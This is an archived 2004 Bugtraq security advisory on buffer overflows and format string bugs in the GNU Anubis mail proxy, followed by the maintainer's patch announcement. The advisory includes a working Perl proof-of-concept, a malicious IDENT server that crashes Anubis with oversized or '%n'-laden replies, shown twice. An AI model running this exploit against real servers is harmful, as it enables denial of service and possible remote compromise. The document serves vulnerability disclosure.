=== Content from marc.info_d9292927_20250125_204907.html ===

```
[[prev in list](?l=bugtraq&m=107850564102190&w=2)] [[next in list](?l=bugtraq&m=107850526405085&w=2)] [prev in thread] [next in thread]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    GNU Anubis buffer overflows and format string bugs
From:       [Ulf =?iso-8859-1?b?SORybmhhbW1hcg==?= <Ulf.Harnhammar.9485 () student ! uu ! se>](?a=107538927000002&r=1&w=2)
Date:       [2004-03-04 19:19:40](?l=bugtraq&r=1&w=2&b=200403)
Message-ID: [1078427980.4047814c1dfe5 () webmail ! uu ! se](?i=1078427980.4047814c1dfe5%20()%20webmail%20!%20uu%20!%20se)
[Download RAW [message](?l=bugtraq&m=107843915424588&q=mbox) or [body](?l=bugtraq&m=107843915424588&q=raw)]

GNU Anubis buffer overflows and format string bugs

PROGRAM: GNU Anubis
VENDOR: Free Software Foundation, Inc.
HOMEPAGE: <http://www.gnu.org/software/anubis/>
VULNERABLE VERSIONS: 3.6.2, 3.9.93, 3.9.92, 3.6.0, 3.6.1,
                     possibly others
IMMUNE VERSIONS: 3.6.2 with vendor patch, 3.9.93 with vendor patch,
                 latest CVS
REFERENCES: not yet

* DESCRIPTION *

"GNU Anubis is an outgoing mail processor. It goes between the MUA
(Mail User Agent) and the MTA (Mail Transport Agent), and can perform
various sorts of processing and conversion on-the-fly in accordance
with the sender's specified rules, based on a highly configurable
regular expressions system. It operates as a proxy server, and can
edit outgoing mail headers, encrypt or sign mail with the GnuPG,
build secure SMTP tunnels using the TLS/SSL encryption even if your
mail user agent doesn't support it, or tunnel a connection through
a SOCKS proxy server."

(quoted from freshmeat.net)

* SUMMARY *

I have found two buffer overflows and three format string bugs
in GNU Anubis. They can all be remotely exploited, potentially to
get root access, as GNU Anubis usually runs as root and drops its
privileges after executing some of the vulnerable functions.

* TECHNICAL DETAILS *

a) There are two buffer overflows in the function auth_ident()
in auth.c. The overflows are caused by sscanf() format strings of
the type "%s" instead of "%63s".

b) There are format string bugs in three instances of the syslog()
call. They are located in the function info() in log.c, the
function anubis_error() in errs.c and the function ssl_error()
in ssl.c. The vulnerable functions take strings partially made up
of user-supplied data, and use them as the format string instead
of using them as parameters ('syslog(priority, string);' instead
of 'syslog(priority, "%s", string);'). These format string bugs
become a bigger problem if you set termlevel to VERBOSE or DEBUG,
as GNU Anubis then will log more data with the syslog() facility.

* SOLUTION *

The vendor has released official security patches for 3.6.2 and
3.9.93. They can be downloaded from the program's homepage. They
correct both the buffer overflows and the format string bugs.

* MALICIOUS IDENT SERVER *

One of the methods of attacking GNU Anubis is through IDENT data,
as it always connects to the client's IDENT server to get more
information about the client. I wrote a simple malicious IDENT
server in Perl. It crashes the current instance of GNU Anubis, either
by using the buffer overflows or by using the format string bugs.
Here it is:

#!/usr/bin/perl --

# anubis-crasher
# Ulf Harnhammar 2004
# I hereby place this program in the Public Domain.

use IO::Socket;

sub usage()
{
  die "usage: $0 type\n".
      "type is 'a' (buffer overflow) or 'b' (format string bug).\n";
} # sub usage

$port = 113;

usage() unless @ARGV == 1;
$type = shift;
usage() unless $type =~ m|^[ab]$|;

$send{'a'} = 'U' x 400;
$send{'b'} = '%n' x 28;
$sendstr = $send{$type};

$server = IO::Socket::INET->new(Proto => 'tcp',
                                LocalPort => $port,
                                Listen => SOMAXCONN,
                                Reuse => 1) or
          die "can't create server: $!";

while ($client = $server->accept())
{
  $client->autoflush(1);
  print "got a connection\n";

  $input = <$client>;
  $input =~ tr/\015\012//d;
  print "client said $input\n";

#  $wait = <STDIN>;
#  $wait = 'be quiet, perl -wc';

  $output = "a: USERID: a:$sendstr";
  print $client "$output\n";
  print "I said $output\n";

  close $client;
  print "disconnected\n";
} # while client=server->accept

__END__

* 31337 IRC KIDDIES *

K: "w0w d00d m0r3 buphph3r 0v3rphl0wzZz 4nd ph0rm4t zZztr1ngzZz!!1!
but why d0 y4 p0zZzt 4b0ut th4t xss ph1lt3r??+??+? w3 1n 'h4ck3rzZz
phr0m h3ll' r n0t 4muzZz3d!! xss 1zZzn't r34lly 4 vuln3r4b1l1ty
c0z 1t'zZz 34zZzy t0 3xpl01t th4t vuln3r4b1l1ty 4nd th3n u c4n't
pr00v3 h0w 31337 u r!!! th3 n31ghb0ur'zZz d4ught3r 1zZz r34lly
cut3 4nd 1ph 1 ph1nd l0tzZz 0ph buphph3r 0v3rphl0wzZz zZzh3'll b3
1mpr3zZzZzZ3d 4nd g0 t0 th3 m0v13zZz w1th m3 but th4t w0n't h4pp3n
1ph 1 ph1nd xss h0l3zZz!!!!11!!!1!!11!!!!"

U: "Virgin."

(Anyone on IRC who doesn't behave like K here is of course OK.)

// Ulf Harnhammar
   kses - 31337 PHP HTML/XHTML filter (no XSS)
   <http://sourceforge.net/projects/kses>

[["anubis-crasher.pl" (application/octet-stream)]](?l=bugtraq&m=107843915424588&q=p3)

#!/usr/bin/perl --

# anubis-crasher
# Ulf Harnhammar 2004
# I hereby place this program in the Public Domain.

use IO::Socket;

sub usage()
{
  die "usage: $0 type\n".
      "type is 'a' (buffer overflow) or 'b' (format string bug).\n";
} # sub usage

$port = 113;

usage() unless @ARGV == 1;
$type = shift;
usage() unless $type =~ m|^[ab]$|;

$send{'a'} = 'U' x 400;
$send{'b'} = '%n' x 28;
$sendstr = $send{$type};

$server = IO::Socket::INET->new(Proto => 'tcp',
                                LocalPort => $port,
                                Listen => SOMAXCONN,
                                Reuse => 1) or
          die "can't create server: $!";

while ($client = $server->accept())
{
  $client->autoflush(1);
  print "got a connection\n";

  $input = <$client>;
  $input =~ tr/\015\012//d;
  print "client said $input\n";

#  $wait = <STDIN>;
#  $wait = 'be quiet, perl -wc';

  $output = "a: USERID: a:$sendstr";
  print $client "$output\n";
  print "I said $output\n";

  close $client;
  print "disconnected\n";
} # while client=server->accept

__END__

[[prev in list](?l=bugtraq&m=107850564102190&w=2)] [[next in list](?l=bugtraq&m=107850526405085&w=2)] [prev in thread] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)



=== Content from mail.gnu.org_176f0a07_20250125_204905.html ===


| | **bug-anubis** | | --- | |
| --- | --- |

[[Top](../)][[All Lists](/archive/html)]

[Advanced](/archive/cgi-bin/namazu.cgi?idxname=bug-anubis)

---

[Date Prev][Date Next][Thread Prev][Thread Next][[Date Index](index.html#00000)][[Thread Index](threads.html#00000)]

## [bug-anubis] Important security update

---

| **From**: | Sergey Poznyakoff |
| --- | --- |

| **Subject**: | [bug-anubis] Important security update |
| **Date**: | Sat, 28 Feb 2004 14:01:49 +0200 |

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Dear Anubis users,

This is to notify you that two vulnerabilities have recently been
discovered in Anubis versions 3.6.2 and 3.9.93. The patches for both
versions are available from the following locations:

Version   URL
- -------   -----------
3.6.2     <http://savannah.gnu.org/patch/?func=detailitem&item_id=2699>
3.9.93    <http://savannah.gnu.org/patch/?func=detailitem&item_id=2700>

The Anubis Team strongly advises you to download and apply
these fixes.

Regards,
Sergey
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.1 (GNU/Linux)
Comment: Processed by Mailcrypt 3.4, an Emacs/PGP interface

iD8DBQFAQIMWNgKwf1XQxzIRAjSBAJ49L+84OvLyv8Jk9Xdi6c0JHS2cgACgmlKR
F5b7o4YklmiyJ404APdjWRM=
=GFEw
-----END PGP SIGNATURE-----

```

---

reply via email to

---

| [Prev in Thread] | **Current Thread** | [Next in Thread] |
| --- | --- | --- |

* **[bug-anubis] Important security update**,
  *Sergey Poznyakoff* **<=**

---

* Index(es):
  + [**Date**](index.html#00000)
  + [**Thread**](threads.html#00000)


